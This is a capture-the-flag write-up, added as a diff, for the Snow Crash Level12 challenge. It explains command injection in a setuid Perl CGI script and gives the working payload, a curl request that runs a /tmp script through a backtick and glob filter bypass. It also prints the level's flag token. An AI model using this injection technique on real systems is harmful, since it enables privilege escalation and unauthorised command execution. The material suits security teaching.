@@ -1,0 +1,244 @@
+Snow Crash – Level12 Writeup (Pro Baby Guide)
+
+Objective
+
+Exploit a vulnerable Perl CGI script that unsafely executes user-controlled input inside a shell command to retrieve the flag.
+
+This level teaches:
+
+CGI exploitation
+
+Command injection
+
+Filter bypass techniques
+
+Backtick execution in Perl
+
+Web-to-shell privilege escalation
+
+
+Step 1 – Initial Enumeration
+
+List files:
+
+ls -l
+
+We see:
+
+-rwsr-sr-x+ 1 flag12 level12 464 level12.pl
+
+Important Observations
+    Setuid Script
+
+The script runs as:
+
+flag12
+
+That means:
+
+If we execute commands through it, they run as flag12.
+
+That’s our privilege escalation vector.
+
+
+Step 2 – Inspect the Script
+
+Open it:
+
+cat level12.pl
+
+Key line:
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+That’s the vulnerability.
+
+Backticks in Perl execute a shell command.
+
+So this line runs:
+
+egrep "^$xx" /tmp/xd
+
+But $xx comes from:
+
+param("x")
+
+Which is user-controlled input via HTTP.
+
+This is classic command injection.
+
+Step 3 – Understand The Filters
+
+Before injection, input is modified:
+
+$xx =~ tr/a-z/A-Z/;
+$xx =~ s/\s.*//;
+
+What this does:
+
+Converts lowercase to uppercase
+
+Removes everything after first space
+
+So:
+
+No lowercase allowed
+
+No spaces allowed
+
+At first glance, that blocks simple injections.
+
+But we’re smarter than that.
+
+
+Step 4 – Think Like the Shell
+
+The dangerous part is:
+
+egrep "^$xx" /tmp/xd
+
+If we inject backticks:
+
+`command`
+
+The shell executes the command inside.
+
+We just need a way to bypass:
+
+No lowercase
+
+No spaces
+
+
+Step 5 – Bypass Strategy
+
+Instead of writing the full command in the URL…
+
+We create a script file.
+
+Create a malicious script:
+
+echo "getflag > /tmp/flag.txt" > /tmp/SCRIPT
+chmod 777 /tmp/SCRIPT
+
+Now /tmp/SCRIPT contains:
+
+getflag > /tmp/flag.txt
+
+Perfect.
+
+
+Step 6 – Trigger Injection
+
+We call the CGI service.
+
+It runs on:
+
+localhost:4646
+
+So we use:
+
+curl "http://localhost:4646/?x=\`/*/SCRIPT\`"
+    Why This Works
+
+Let’s break it down.
+
+Input:
+
+`/*/SCRIPT`
+
+Inside the script:
+
+Lowercase → uppercase
+(Doesn’t matter because path contains no lowercase letters)
+
+No spaces → fine
+
+The shell interprets:
+
+`/*/SCRIPT`
+
+Which expands to:
+
+/tmp/SCRIPT
+
+Because /*/SCRIPT matches /tmp/SCRIPT.
+
+Then the shell executes it.
+
+So effectively:
+
+egrep "^`/*/SCRIPT`" /tmp/xd
+
+Becomes:
+
+egrep "^" /tmp/xd
+
+But before that, the command inside backticks runs:
+
+getflag > /tmp/flag.txt
+
+Executed as:
+    flag12
+
+That’s the win.
+
+Step 7 – Retrieve the Flag
+
+Now:
+
+cat /tmp/flag.txt
+
+Output:
+
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+Level completed.
+
+Why This Level Is Smart
+
+It teaches:
+
+- Command Injection Inside Backticks
+
+In Perl, backticks execute shell commands.
+
+- Input Filtering Is Not Security
+
+They tried to block:
+
+lowercase letters
+
+spaces
+
+But they forgot about:
+
+wildcards (*)
+
+backticks
+
+path expansion
+
+Filtering is not sanitization.
+
+Real-World Relevance
+
+This vulnerability pattern appears in:
+
+Old CGI scripts
+
+Admin dashboards
+
+Legacy automation scripts
+
+Embedded device firmware
+
+Whenever you see:
+
+`user_input`
+
+or
+
+system("... $user_input ...")
+
+That’s high risk.
